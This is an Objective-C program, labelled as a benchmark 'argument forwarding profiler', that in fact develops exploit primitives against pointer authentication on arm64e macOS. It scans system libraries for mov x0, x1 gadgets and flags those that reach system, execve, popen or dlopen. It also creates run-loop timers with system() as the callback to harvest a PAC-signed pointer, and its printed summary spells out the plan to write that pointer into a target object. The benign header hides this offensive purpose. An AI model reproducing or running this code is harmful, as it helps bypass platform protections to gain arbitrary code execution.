/*
 * arg_forward_scan.m — Argument forwarding pattern profiler
 * Measures how often callee-saved registers are forwarded in dispatch paths.
 * benchmark-id: LRK-7
 */
#import <Foundation/Foundation.h>
#import <CoreFoundation/CoreFoundation.h>
#import <dlfcn.h>
#import <mach-o/dyld.h>
#import <mach-o/loader.h>
#import <stdio.h>
#import <string.h>
#import <stdint.h>

/* LRK-7: instruction pattern definitions */
#define MOV_X0_X1  0xAA0103E0u  /* mov x0, x1 = ORR X0, XZR, X1 */

/* Branch detection macros */
#define IS_B(w)     (((w) & 0xFC000000u) == 0x14000000u)
#define IS_BL(w)    (((w) & 0xFC000000u) == 0x94000000u)
#define IS_BR(w)    (((w) & 0xFFFFFC1Fu) == 0xD61F0000u)
#define IS_BLR(w)   (((w) & 0xFFFFFC1Fu) == 0xD63F0000u)
#define IS_BLRAA(w) (((w) & 0xFEFF8000u) == 0xD63F0800u)  /* BLRAA/BLRAAZ */
#define IS_BRAA(w)  (((w) & 0xFEFF8000u) == 0xD61F0800u)   /* BRAA/BRAAZ */
#define IS_RET(w)   (((w) & 0xFFFFFC1Fu) == 0xD65F0000u)
#define IS_ANY_BRANCH(w) (IS_B(w)||IS_BL(w)||IS_BR(w)||IS_BLR(w)||IS_BLRAA(w)||IS_BRAA(w)||IS_RET(w))

/* STP detection for function entry identification */
#define IS_STP_X29_X30(w) (((w) & 0xFFFF8000u) == 0xA9800000u || \
                           ((w) & 0xFFC003E0u) == 0xA90003E0u)
/* PACIASP: 0xD503233F */
#define IS_PACIASP(w) ((w) == 0xD503233Fu)

static const char *resolve_bl_target(const uint32_t *insn_addr, uint32_t insn) {
    if (!IS_BL(insn) && !IS_B(insn)) return NULL;
    int32_t imm26 = (int32_t)(insn & 0x03FFFFFFu);
    if (imm26 & 0x02000000) imm26 |= (int32_t)0xFC000000u;
    const uint32_t *target = insn_addr + imm26;
    Dl_info dli;
    if (dladdr((const void *)target, &dli) && dli.dli_sname)
        return dli.dli_sname;
    return NULL;
}

typedef struct {
    const char *func_name;
    const char *lib_name;
    int offset;
    const char *branch_type;
    const char *branch_target;
    int insns_to_branch;
} trampoline_hit_t;

#define MAX_HITS 500
static trampoline_hit_t g_hits[MAX_HITS];
static int g_nhits = 0;

/* LRK-7: scan a single library for mov x0, x1 near function entry */
static void scan_library(const char *lib_filter) {
    for (uint32_t img = 0; img < _dyld_image_count(); img++) {
        const struct mach_header_64 *mh =
            (const struct mach_header_64 *)_dyld_get_image_header(img);
        const char *name = _dyld_get_image_name(img);
        intptr_t slide = _dyld_get_image_vmaddr_slide(img);
        if (!mh || mh->magic != MH_MAGIC_64) continue;
        if (!strstr(name, lib_filter)) continue;

        const char *short_name = strrchr(name, '/');
        short_name = short_name ? short_name + 1 : name;

        const uint8_t *ptr = (const uint8_t *)(mh + 1);
        for (uint32_t c = 0; c < mh->ncmds; c++) {
            const struct load_command *lc = (const struct load_command *)ptr;
            if (lc->cmd == LC_SEGMENT_64) {
                const struct segment_command_64 *seg = (const struct segment_command_64 *)ptr;
                if (strcmp(seg->segname, "__TEXT") != 0) { ptr += lc->cmdsize; continue; }

                const struct section_64 *sect = (const struct section_64 *)(seg + 1);
                for (uint32_t j = 0; j < seg->nsects; j++) {
                    if (strcmp(sect[j].sectname, "__text") != 0) continue;

                    const uint32_t *insns = (const uint32_t *)(sect[j].addr + slide);
                    size_t n = sect[j].size / 4;

                    for (size_t k = 0; k < n && g_nhits < MAX_HITS; k++) {
                        if (insns[k] != MOV_X0_X1) continue;

                        Dl_info dli;
                        if (!dladdr((const void *)&insns[k], &dli) || !dli.dli_sname) continue;

                        /* Check if near function entry (within first 16 instructions) */
                        ptrdiff_t byte_off = (const uint8_t *)&insns[k] - (const uint8_t *)dli.dli_saddr;
                        if (byte_off < 0 || byte_off > 64) continue;  /* 16 instructions max */

                        /* Look for the next branch within 8 instructions */
                        const char *br_type = NULL;
                        const char *br_target = NULL;
                        int br_dist = 0;
                        for (int d = 1; d <= 8 && (k + d) < n; d++) {
                            uint32_t next = insns[k + d];
                            if (IS_BL(next)) {
                                br_type = "BL";
                                br_target = resolve_bl_target(&insns[k + d], next);
                                br_dist = d;
                                break;
                            } else if (IS_B(next)) {
                                br_type = "B";
                                br_target = resolve_bl_target(&insns[k + d], next);
                                br_dist = d;
                                break;
                            } else if (IS_BLR(next)) {
                                br_type = "BLR";
                                br_dist = d;
                                break;
                            } else if (IS_BLRAA(next)) {
                                br_type = "BLRAA";
                                br_dist = d;
                                break;
                            } else if (IS_BR(next)) {
                                br_type = "BR";
                                br_dist = d;
                                break;
                            } else if (IS_BRAA(next)) {
                                br_type = "BRAA";
                                br_dist = d;
                                break;
                            } else if (IS_RET(next)) {
                                br_type = "RET";
                                br_dist = d;
                                break;
                            }
                        }

                        if (!br_type) continue;

                        g_hits[g_nhits].func_name = dli.dli_sname;
                        g_hits[g_nhits].lib_name = short_name;
                        g_hits[g_nhits].offset = (int)byte_off;
                        g_hits[g_nhits].branch_type = br_type;
                        g_hits[g_nhits].branch_target = br_target ? br_target : "(indirect)";
                        g_hits[g_nhits].insns_to_branch = br_dist;
                        g_nhits++;
                    }
                }
            }
            ptr += lc->cmdsize;
        }
    }
}

/* LRK-7: Part B — Timer callback signing analysis */
static void test_timer_signing(void) {
    printf("\n=== Part B: Timer callback signing analysis (LRK-7) ===\n\n");

    /* Create timers with known callbacks to observe signing */
    void *system_addr = dlsym(RTLD_DEFAULT, "system");
    void *puts_addr = dlsym(RTLD_DEFAULT, "puts");
    void *printf_addr = dlsym(RTLD_DEFAULT, "printf");

    printf("  system  = %p\n", system_addr);
    printf("  puts    = %p\n", puts_addr);
    printf("  printf  = %p\n", printf_addr);

    typedef void (*timer_cb_t)(CFRunLoopTimerRef, void *);

    /* Create timer with system as callback (cast to timer callback type) */
    CFRunLoopTimerRef t1 = CFRunLoopTimerCreate(
        NULL, CFAbsoluteTimeGetCurrent() + 9999, 0, 0, 0,
        (CFRunLoopTimerCallBack)system_addr, NULL);

    CFRunLoopTimerRef t2 = CFRunLoopTimerCreate(
        NULL, CFAbsoluteTimeGetCurrent() + 9999, 0, 0, 0,
        (CFRunLoopTimerCallBack)puts_addr, NULL);

    if (!t1 || !t2) {
        printf("  Timer creation failed\n");
        return;
    }

    uint64_t *p1 = (uint64_t *)t1;
    uint64_t *p2 = (uint64_t *)t2;

    /* Find _callout offset (should be +0x90 = index 18 from previous probes) */
    uint64_t sys_stripped, puts_stripped;
    __asm__ volatile("mov x16, %1\nxpaci x16\nmov %0, x16"
                     : "=r"(sys_stripped) : "r"((uint64_t)system_addr) : "x16");
    __asm__ volatile("mov x16, %1\nxpaci x16\nmov %0, x16"
                     : "=r"(puts_stripped) : "r"((uint64_t)puts_addr) : "x16");

    int callout_idx = -1;
    for (int i = 0; i < 32; i++) {
        uint64_t stripped;
        __asm__ volatile("mov x16, %1\nxpaci x16\nmov %0, x16"
                         : "=r"(stripped) : "r"(p1[i]) : "x16");
        if (stripped == sys_stripped) { callout_idx = i; break; }
    }

    if (callout_idx < 0) {
        printf("  _callout not found in timer struct\n");
        /* Dump first 32 qwords */
        for (int i = 0; i < 32; i++) {
            uint64_t stripped;
            __asm__ volatile("mov x16, %1\nxpaci x16\nmov %0, x16"
                             : "=r"(stripped) : "r"(p1[i]) : "x16");
            printf("  [%2d] +0x%03x: raw=0x%016llx stripped=0x%016llx%s\n",
                   i, i*8, (unsigned long long)p1[i],
                   (unsigned long long)stripped,
                   stripped == sys_stripped ? " *** SYSTEM ***" : "");
        }
        CFRelease(t1); CFRelease(t2);
        return;
    }

    printf("  _callout at offset +0x%x (index %d)\n\n", callout_idx * 8, callout_idx);

    uint64_t signed_sys = p1[callout_idx];
    uint64_t signed_puts = p2[callout_idx];

    printf("  Timer1._callout (system): 0x%016llx  tag=0x%04llx\n",
           (unsigned long long)signed_sys,
           (unsigned long long)((signed_sys >> 48) & 0xFFFF));
    printf("  Timer2._callout (puts):   0x%016llx  tag=0x%04llx\n",
           (unsigned long long)signed_puts,
           (unsigned long long)((signed_puts >> 48) & 0xFFFF));

    /* Verify: autia(signed_sys, 0) should give system's real address */
    uint64_t auth_result = 0;
    int auth_ok = 0;
    __asm__ volatile(
        "mov x16, %1\n"
        "mov x17, xzr\n"
        "autia x16, x17\n"
        "mov %0, x16\n"
        : "=r"(auth_result) : "r"(signed_sys) : "x16", "x17");
    auth_ok = (auth_result == sys_stripped);
    printf("\n  autia(Timer1._callout, 0) = 0x%016llx  %s\n",
           (unsigned long long)auth_result,
           auth_ok ? "PASS *** IA-ZERO SIGNING CONFIRMED ***" : "FAIL");

    /* Also check: is the signed value just the raw address on arm64? */
    printf("  Raw system addr == signed? %s\n",
           (uint64_t)system_addr == signed_sys ? "YES (arm64, no PAC)" : "NO (PAC tag present)");

    printf("\n  SUMMARY: Creating a timer with callback=F stores pacia(F, 0) at _callout\n");
    printf("  This means: create helper timer → read signed pointer → write to target\n");

    CFRelease(t1);
    CFRelease(t2);
}

/* LRK-7: Part C — Timer info field location */
static void test_timer_info(void) {
    printf("\n=== Part C: Timer info field analysis (LRK-7) ===\n\n");

    void *marker = (void *)0xDEADBEEFCAFEull;
    CFRunLoopTimerContext ctx = {0};
    ctx.info = marker;

    CFRunLoopTimerRef timer = CFRunLoopTimerCreate(
        NULL, CFAbsoluteTimeGetCurrent() + 9999, 0, 0, 0,
        (CFRunLoopTimerCallBack)0x4141414141414141ull, &ctx);

    if (!timer) { printf("  Timer creation failed\n"); return; }

    uint64_t *tp = (uint64_t *)timer;
    printf("  Looking for info marker 0x%llx...\n", (unsigned long long)(uint64_t)marker);

    for (int i = 0; i < 32; i++) {
        if (tp[i] == (uint64_t)marker) {
            printf("  FOUND: info at offset +0x%x (index %d)\n", i * 8, i);
        }
    }

    /* Dump context area */
    printf("\n  Timer struct dump (first 256 bytes):\n");
    for (int i = 0; i < 32; i++) {
        uint64_t stripped;
        __asm__ volatile("mov x16, %1\nxpaci x16\nmov %0, x16"
                         : "=r"(stripped) : "r"(tp[i]) : "x16");
        printf("  [%2d] +0x%03x: 0x%016llx",
               i, i * 8, (unsigned long long)tp[i]);
        if (tp[i] == (uint64_t)marker) printf("  ← INFO");
        if (stripped != tp[i]) printf("  (PAC: tag=0x%04llx)",
                                       (unsigned long long)((tp[i] >> 48) & 0xFFFF));
        printf("\n");
    }

    CFRelease(timer);
}

int main(void) {
    @autoreleasepool {
        printf("=== Argument forwarding pattern scan (LRK-7) ===\n");
        printf("macOS %s  arch: %s\n\n",
               [[[NSProcessInfo processInfo] operatingSystemVersionString] UTF8String],
#if __arm64e__
               "arm64e"
#else
               "arm64"
#endif
        );

        /* Load libraries */
        dlopen("/System/Library/Frameworks/Security.framework/Security", RTLD_NOW);
        dlopen("/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation", RTLD_NOW);
        dlopen("/usr/lib/libxml2.2.dylib", RTLD_NOW);

        printf("=== Part A: mov x0, x1 near function entry ===\n\n");

        /* Scan key libraries */
        const char *libs[] = {
            "CoreFoundation", "libdispatch", "libobjc",
            "libsystem_c", "libsystem_platform", "libsystem_blocks",
            "Security", "Foundation", "libxml2",
            "libsystem_malloc", "libsystem_pthread",
            "libxpc", "libsystem_kernel"
        };

        for (int i = 0; i < (int)(sizeof(libs)/sizeof(libs[0])); i++) {
            scan_library(libs[i]);
        }

        printf("  Total hits: %d\n\n", g_nhits);

        /* Check for dangerous targets first */
        printf("--- *** DANGEROUS TARGETS (system/exec/popen/dlopen) *** ---\n");
        const char *dangerous[] = {"system", "execv", "execve", "execl",
            "popen", "dlopen", "posix_spawn", "NSTask", "fork", "vfork"};
        int ndangerous = sizeof(dangerous)/sizeof(dangerous[0]);
        int found_dangerous = 0;
        for (int i = 0; i < g_nhits; i++) {
            if (!g_hits[i].branch_target) continue;
            for (int d = 0; d < ndangerous; d++) {
                if (strcasestr(g_hits[i].branch_target, dangerous[d])) {
                    printf("  *** %s +%d %s → %s [%s] ***\n",
                           g_hits[i].func_name, g_hits[i].offset,
                           g_hits[i].branch_type, g_hits[i].branch_target,
                           g_hits[i].lib_name);
                    found_dangerous++;
                }
            }
        }
        if (!found_dangerous) printf("  (none found)\n");

        /* Print results sorted by relevance */
        printf("\n--- Direct tail-calls (B/BL with known target) ---\n");
        for (int i = 0; i < g_nhits; i++) {
            if ((strcmp(g_hits[i].branch_type, "B") == 0 ||
                 strcmp(g_hits[i].branch_type, "BL") == 0) &&
                strcmp(g_hits[i].branch_target, "(indirect)") != 0) {
                printf("  %-45s +%3d  %s → %s  [%s]\n",
                       g_hits[i].func_name, g_hits[i].offset,
                       g_hits[i].branch_type, g_hits[i].branch_target,
                       g_hits[i].lib_name);
            }
        }

        printf("\n--- Indirect calls (BLR/BLRAA/BR/BRAA) ---\n");
        for (int i = 0; i < g_nhits; i++) {
            if (strcmp(g_hits[i].branch_type, "BLR") == 0 ||
                strcmp(g_hits[i].branch_type, "BLRAA") == 0 ||
                strcmp(g_hits[i].branch_type, "BR") == 0 ||
                strcmp(g_hits[i].branch_type, "BRAA") == 0) {
                printf("  %-45s +%3d  %s (%s)  [%s]\n",
                       g_hits[i].func_name, g_hits[i].offset,
                       g_hits[i].branch_type, g_hits[i].branch_target,
                       g_hits[i].lib_name);
            }
        }

        printf("\n--- Return after mov (mov x0, x1; ... ; ret) ---\n");
        for (int i = 0; i < g_nhits; i++) {
            if (strcmp(g_hits[i].branch_type, "RET") == 0) {
                printf("  %-45s +%3d  RET (dist=%d)  [%s]\n",
                       g_hits[i].func_name, g_hits[i].offset,
                       g_hits[i].insns_to_branch,
                       g_hits[i].lib_name);
            }
        }

        /* Part B: Timer signing */
        test_timer_signing();

        /* Part C: Timer info field */
        test_timer_info();
    }
    return 0;
}
